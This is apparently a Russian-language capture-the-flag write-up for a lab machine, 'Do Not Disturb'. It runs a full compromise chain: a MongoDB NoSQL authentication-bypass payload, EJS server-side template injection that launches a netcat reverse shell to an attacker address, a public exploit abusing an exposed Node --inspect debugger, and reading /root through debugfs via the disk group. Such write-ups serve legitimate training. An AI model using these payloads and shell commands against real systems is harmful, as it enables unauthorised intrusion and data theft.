# Машина Do Not Disturb

## Цель

Получить первоначальный доступ к целевой системе, повысить привилегии до пользователя root и извлечь оба флага.


# 1. Разведка

## Сканирование Nmap

Первым этапом было выполнено сканирование открытых портов.

В результате были обнаружены следующие сервисы:

| Порт   | Сервис            |
| ------ | ----------------- |
| 22/tcp | SSH               |
| 80/tcp | Node.js (Express) |

Было определено, что веб-приложение работает на платформе **Node.js** с использованием фреймворка **Express**.


# 2. Исследование веб-приложения

На главной странице расположена форма авторизации, содержащая два поля:

* **Guest ID**
* **Passphrase**

Далее был выполнен фаззинг директорий и маршрутов приложения.

Были обнаружены следующие эндпоинты:

* `/`
* `/login`
* `/logout`
* `/staff`

При попытке обращения к `/staff` сервер возвращал:

```http
403 Forbidden
```

Проверка стандартных учетных данных результата не дала.

Во всех случаях приложение отвечало сообщением:

```
Invalid credentials.
```

Поскольку в placeholder формы присутствовало имя пользователя **attendant**, была предпринята попытка перебора пароля для данной учетной записи, однако авторизация не удалась.


# 3. Поиск инъекций

## SQL Injection

Эндпоинт авторизации был протестирован с использованием **sqlmap**.

Инструмент не выявил признаков SQL-инъекции.


## Проверка обхода авторизации Express Middleware

Так как сервис идентифицировался как **Express middleware**, была предпринята попытка эксплуатации известной уязвимости обхода авторизации:

**CVE-2025-29927**

Эксплуатация не удалась, поскольку приложение использовало обычный Express, а не уязвимый Next.js Middleware.


# 4. Эксплуатация NoSQL Injection

Далее была выполнена проверка формы авторизации на наличие **MongoDB NoSQL Injection**.

Следующий payload оказался успешным:

```http
username[$ne]=dfdsfdsfdsf&password[$ne]=dfdsfdsfdsf
```

После отправки запроса приложение выполнило перенаправление на страницу:

```
/staff
```

Однако доступ по-прежнему завершался ответом:

```
403 Forbidden
```

Это свидетельствовало о том, что проверку аутентификации удалось обойти, однако механизм авторизации определил, что текущий пользователь не обладает ролью **staff**.


# 5. Перебор пользователей

Для поиска существующих сотрудников был сформирован большой словарь возможных должностей персонала гостиницы.

Перебор выполнялся при помощи **Burp Suite Intruder**.

Несмотря на большое количество проверенных вариантов, дополнительных пользователей с необходимыми правами обнаружить не удалось.


# 6. Обход логики авторизации

При ручной обработке HTTP-запросов через **Burp Suite Forward** удалось перевести приложение на следующий этап авторизации.

После этого приложение сообщило, что текущая сессия принадлежит пользователю:

```
attendant
```

Далее открылся функционал предварительного просмотра сообщения подтверждения бронирования.

Использовался следующий запрос:

```
POST /staff/preview
```

с параметром

```text
template=Dear <%= guest %>, your Byte Lotus cabana is confirmed.
```

На этом этапе стало очевидно, что приложение использует шаблонизатор **EJS**.


# 7. Server-Side Template Injection (EJS)

Для проверки возможности выполнения произвольного кода был использован простой арифметический payload:

```ejs
Dear <%= 7+7 %>, your Byte Lotus cabana is confirmed.
```

В результате приложение отобразило:

```
Dear 14, your Byte Lotus cabana is confirmed.
```

Это подтвердило наличие **Server-Side Template Injection (SSTI)**.


## Сбор информации

В первую очередь были получены переменные окружения процесса:

```ejs
<%=JSON.stringify(process.env)%>
```

Полученные данные:

```
USER=poolside
NODE_ENV=production
HOME=/home/poolside
```

Далее были извлечены аргументы запуска приложения:

```ejs
<%=JSON.stringify(process.argv)%>
```

Результат:

```
[
"/usr/bin/node",
"/opt/poolside/app.js"
]
```

Это позволило определить расположение основного приложения.


## Получение удаленного выполнения команд

Используя объект `process`, удалось получить доступ к модулю Node.js `child_process` через:

```javascript
process.mainModule.require()
```

После чего был сформирован payload, выполняющий запуск reverse shell:

```ejs
<%=process.mainModule.require('child_process').execSync('busybox nc l_ip l_port -e sh')%>
```

После обработки шаблона был успешно получен shell.

Права текущего пользователя:

```
uid=996(poolside)
gid=996(poolside)
groups=996(poolside)
```

После получения интерактивного доступа был найден пользовательский флаг.

# 8. Повышение привилегий до pipelinesvc

При локальном исследовании системы был обнаружен пользователь:

```
pipelinesvc
```

В каталоге `/opt`, рядом с основным приложением, находился дополнительный проект:

```
processor.js
```

Из файла конфигурации было установлено, что процесс запускается следующим образом:

```bash
/usr/bin/node --inspect=127.0.0.1:9229 processor.js
```


## Эксплуатация Node Inspector

Использование параметра `--inspect` включает интерфейс удаленной отладки **V8 Inspector Protocol**.

Данный интерфейс предоставляет возможность выполнять JavaScript непосредственно внутри процесса через WebSocket-соединение.

В открытом доступе был найден готовый exploit:

```
node_inspector.py
```

Скрипт был загружен на атакующую машину, после чего передан на целевую систему.

Для получения reverse shell использовалась следующая команда:

```bash
python3 node_inspector.py \
    --payload revshell \
    --lhost ip \ 
    --lport port
```

В результате был получен shell от имени пользователя:

```
uid=995(pipelinesvc)
gid=995(pipelinesvc)
groups=995(pipelinesvc),6(disk)
```

Дополнительно было установлено, что пользователь входит в группу **disk**, что потенциально позволяет работать напрямую с блочными устройствами.


# 9. Повышение привилегий до root

Первым этапом были найдены устройства, принадлежащие группе **disk**:

```bash
find /dev -group disk
```

Было обнаружено системное устройство:

```
/dev/nvme0n1p1
```


## Использование debugfs

Для непосредственного доступа к файловой системе была использована утилита **debugfs**.

Подключение выполнялось командой:

```bash
debugfs /dev/nvme0n1p1
```

После открытия файловой системы удалось перейти в директорию root без возникновения ошибок доступа:

```bash
cd /root
```

Далее был успешно выполнен просмотр содержимого каталога:

```bash
ls
```

После чего был прочитан файл:

```bash
cat root.txt
```

Таким образом был получен root-флаг без необходимости изменять права доступа или использовать дополнительные эксплойты.

# Обнаруженные уязвимости

* NoSQL Injection (обход механизма аутентификации)
* Недостаточная проверка прав доступа
* Server-Side Template Injection (EJS)
* Удаленное выполнение команд через Node.js
* Использование режима отладки Node.js (`--inspect`) в рабочем окружении
* Членство сервисного пользователя в привилегированной группе `disk`
* Возможность прямого чтения файловой системы через `debugfs`

# Итог

В ходе эксплуатации удалось построить полную цепочку компрометации системы. Используя NoSQL-инъекцию был выполнен обход механизма аутентификации, после чего через уязвимость Server-Side Template Injection в шаблонизаторе EJS было получено удаленное выполнение команд и интерактивный shell от имени пользователя **poolside**. Дальнейшее исследование системы позволило обнаружить процесс Node.js, запущенный с включенным режимом отладки (`--inspect`), что обеспечило выполнение произвольного JavaScript-кода внутри процесса и получение доступа от имени пользователя **pipelinesvc**. Благодаря членству данного пользователя в группе **disk** появилась возможность напрямую открыть файловую систему через `debugfs`, получить доступ к каталогу `/root` и извлечь root-флаг, завершив полную компрометацию целевой машины.
